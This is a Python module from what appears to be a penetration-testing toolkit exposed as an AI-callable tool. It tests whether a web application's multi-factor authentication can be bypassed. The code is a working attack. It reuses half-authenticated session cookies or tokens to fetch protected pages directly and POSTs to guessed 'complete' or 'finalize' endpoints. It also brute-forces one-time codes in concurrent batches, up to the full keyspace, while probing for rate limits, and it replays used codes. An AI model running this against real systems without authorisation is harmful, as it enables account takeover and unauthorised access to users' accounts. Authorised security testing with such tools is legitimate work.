"""Implementation for test_mfa_bypass — split from mfa_bypass.py to keep the tool
wrapper thin. The wrapper in mfa_bypass.py owns the @mcp.tool() signature +
docstring and delegates here."""

from __future__ import annotations

import asyncio
from typing import Any

from praetor.tools.testing._verdict import error_verdict, make_verdict
from ._mfa_helpers import _OTP_TOP_LIST, _send, _build_auth_headers


async def _run_test_mfa_bypass(
    mfa_verify_url: str,
    protected_url: str = "",
    partial_session_cookies: dict | None = None,
    partial_session_bearer: str = "",
    code_param: str = "code",
    code_in: str = "json_body",
    used_code: str = "",
    otp_length: int = 6,
    full_brute: bool = False,
    max_brute_attempts: int = 500,
) -> dict:
    if not partial_session_cookies and not partial_session_bearer:
        return error_verdict(
            "provide partial_session_cookies or partial_session_bearer — "
            "these are the half-authenticated credentials to promote.",
            vuln_type="mfa_bypass",
        )

    report: list[str] = ["test_mfa_bypass:\n"]
    bypasses: list[str] = []

    # ── §1 Direct resource access (skip MFA entirely) ──
    if protected_url:
        headers = _build_auth_headers(
            protected_url, partial_session_cookies, partial_session_bearer)
        r = await _send("GET", protected_url, headers)
        if "error" in r:
            report.append(f"§1 Direct-resource: ERROR {r['error']}")
        else:
            s = r.get("status_code", 0)
            ln = r.get("response_length", 0)
            idx = r.get("history_index", -1)
            report.append(f"§1 Direct-resource GET {protected_url}")
            report.append(f"   -> {s} ({ln}b, logger #{idx})")
            if s in (200, 302):
                report.append("   *** BYPASS: protected resource accessible "
                              "with first-factor-only session ***")
                bypasses.append(
                    f"§1 direct-resource access -> {s} (logger #{idx})")
            else:
                report.append("   OK: MFA enforced on resource fetch.")
            report.append("")

    # ── §2 Step-skip (POST directly to a finalize endpoint) ──
    # Heuristic: many flows have /mfa/verify + /mfa/complete; if operator
    # gave us only /mfa/verify, try POSTing to common "complete" paths.
    if mfa_verify_url:
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(mfa_verify_url)
        candidates_paths = [
            parsed.path.replace("verify", "complete"),
            parsed.path.replace("verify", "finalize"),
            parsed.path.replace("verify", "confirm"),
            parsed.path + "/complete",
            parsed.path + "/finalize",
        ]
        seen_paths: set[str] = set()
        step_skip_tasks = []
        step_skip_labels = []
        for p in candidates_paths:
            if p == parsed.path or p in seen_paths or not p:
                continue
            seen_paths.add(p)
            step_skip_url = urlunparse(parsed._replace(path=p))
            headers = _build_auth_headers(
                step_skip_url, partial_session_cookies,
                partial_session_bearer)
            step_skip_tasks.append(asyncio.create_task(
                _send("POST", step_skip_url, headers, json_body={})))
            step_skip_labels.append(step_skip_url)

        if step_skip_tasks:
            results = await asyncio.gather(*step_skip_tasks,
                                           return_exceptions=True)
            report.append("§2 Step-skip (POST direct to finalize paths):")
            for url_, r in zip(step_skip_labels, results):
                if isinstance(r, Exception):
                    report.append(f"   {url_}  EXC {type(r).__name__}")
                    continue
                s = r.get("status_code", 0)
                idx = r.get("history_index", -1)
                report.append(f"   {url_}  -> {s} (logger #{idx})")
                if s in (200, 302):
                    bypasses.append(f"§2 step-skip {url_} -> {s}")
            report.append("")

    # ── §3 Brute / rate-limit detect ──
    candidates: list[str] = []
    for c in _OTP_TOP_LIST:
        if len(c) == otp_length:
            candidates.append(c)
    if full_brute:
        for i in range(10 ** otp_length):
            candidates.append(str(i).zfill(otp_length))
    # Trim
    candidates = candidates[:max_brute_attempts]

    report.append(f"§3 Brute / rate-limit ({len(candidates)} attempts, "
                  f"OTP length {otp_length}):")

    async def _try_code(code: str) -> tuple[str, dict]:
        headers = _build_auth_headers(
            mfa_verify_url, partial_session_cookies,
            partial_session_bearer)
        method = "POST"
        json_b: dict | None = None
        body = ""
        if code_in == "json_body":
            json_b = {code_param: code}
        elif code_in == "form":
            body = f"{code_param}={code}"
            headers.setdefault("Content-Type",
                               "application/x-www-form-urlencoded")
        elif code_in == "query":
            from urllib.parse import urlparse, urlencode, urlunparse
            parsed = urlparse(mfa_verify_url)
            qs = urlencode({code_param: code})
            url2 = urlunparse(parsed._replace(query=qs))
            r = await _send("GET", url2, headers)
            return code, r
        r = await _send(method, mfa_verify_url, headers, body=body,
                        json_body=json_b)
        return code, r

    # Run in batches of 25 to keep the proxy happy.
    BATCH = 25
    first_rate_limit: dict[str, Any] | None = None
    first_success: tuple[str, dict] | None = None
    sent = 0
    for batch_start in range(0, len(candidates), BATCH):
        batch = candidates[batch_start: batch_start + BATCH]
        results = await asyncio.gather(
            *[_try_code(c) for c in batch], return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                continue
            code, resp = r
            if "error" in resp:
                continue
            s = resp.get("status_code", 0)
            sent += 1
            if s == 429 or s == 423 or s == 503:
                if first_rate_limit is None:
                    first_rate_limit = {"at": sent, "code": code,
                                        "status": s,
                                        "idx": resp.get("history_index", -1)}
            if s in (200, 302) and code != used_code:
                # Look for an absence of failure markers — a 200 isn't
                # enough, the body could still say "invalid". The
                # operator should verify, but flag a strong signal.
                body = resp.get("response_body", "")
                if not any(k in body.lower() for k in
                           ("invalid", "incorrect", "wrong", "expired",
                            "failed")):
                    first_success = (code, resp)
                    break
        if first_success:
            break

    if first_success:
        code, resp = first_success
        idx = resp.get("history_index", -1)
        report.append(f"   *** BRUTE HIT *** code={code} returned "
                      f"{resp.get('status_code')} (logger #{idx}) "
                      f"after {sent} attempts")
        bypasses.append(f"§3 brute hit code={code} (logger #{idx})")
    else:
        report.append(f"   {sent} attempts, no brute hit.")

    if first_rate_limit is None and sent > 50:
        report.append("   *** NO RATE LIMIT *** server accepted "
                      f"{sent} consecutive guesses without 429/423/503.")
        bypasses.append(f"§3 no rate-limit (>{sent} attempts no throttle)")
    elif first_rate_limit:
        report.append(f"   Rate limit kicked at attempt "
                      f"{first_rate_limit['at']} -> "
                      f"{first_rate_limit['status']} (logger "
                      f"#{first_rate_limit['idx']})")

    report.append("")

    # ── §4 Code reuse ──
    if used_code:
        headers = _build_auth_headers(
            mfa_verify_url, partial_session_cookies,
            partial_session_bearer)
        json_b: dict | None = None
        body = ""
        url2 = mfa_verify_url
        if code_in == "json_body":
            json_b = {code_param: used_code}
        elif code_in == "form":
            body = f"{code_param}={used_code}"
            headers.setdefault("Content-Type",
                               "application/x-www-form-urlencoded")
        elif code_in == "query":
            from urllib.parse import urlparse, urlencode, urlunparse
            parsed = urlparse(mfa_verify_url)
            qs = urlencode({code_param: used_code})
            url2 = urlunparse(parsed._replace(query=qs))
        method = "GET" if code_in == "query" else "POST"
        r = await _send(method, url2, headers, body=body, json_body=json_b)
        if "error" in r:
            report.append(f"§4 Code-reuse: ERROR {r['error']}")
        else:
            s = r.get("status_code", 0)
            idx = r.get("history_index", -1)
            report.append(f"§4 Code-reuse: replay used_code={used_code!r}")
            report.append(f"   -> {s} (logger #{idx})")
            if s in (200, 302):
                body_l = (r.get("response_body", "") or "").lower()
                if not any(k in body_l for k in
                           ("invalid", "incorrect", "expired", "already")):
                    report.append("   *** REUSE BYPASS: same code valid twice ***")
                    bypasses.append(f"§4 code-reuse logger #{idx}")
            report.append("")

    report.append("─" * 60)
    if bypasses:
        report.append(f"BYPASSES: {len(bypasses)}")
        for b in bypasses:
            report.append(f"  - {b}")
        report.append("")
        report.append("Verify each via verify-finding.md before save_finding.")
    else:
        report.append("MFA layer appears solid across direct-resource, "
                      "step-skip, brute, and reuse axes.")

    human = "\n".join(report)
    import re
    logger_indices = [int(m) for m in re.findall(r"#(-?\d+)", human) if int(m) >= 0][:10]

    if len(bypasses) >= 2:
        verdict, confidence = "CONFIRMED", 0.85
        ev = f"MFA bypassed via {len(bypasses)} axes: {'; '.join(bypasses[:3])}"
    elif len(bypasses) == 1:
        verdict, confidence = "SUSPECTED", 0.6
        ev = f"single MFA axis broken: {bypasses[0]}"
    else:
        verdict, confidence = "FAILED", 0.1
        ev = "MFA solid across direct-resource / step-skip / brute / reuse"

    return make_verdict(
        verdict, confidence, ev,
        vuln_type="mfa_bypass",
        logger_indices=logger_indices,
        details={
            "mfa_verify_url": mfa_verify_url,
            "protected_url": protected_url,
            "bypasses": bypasses,
        },
        summary=human,
    )
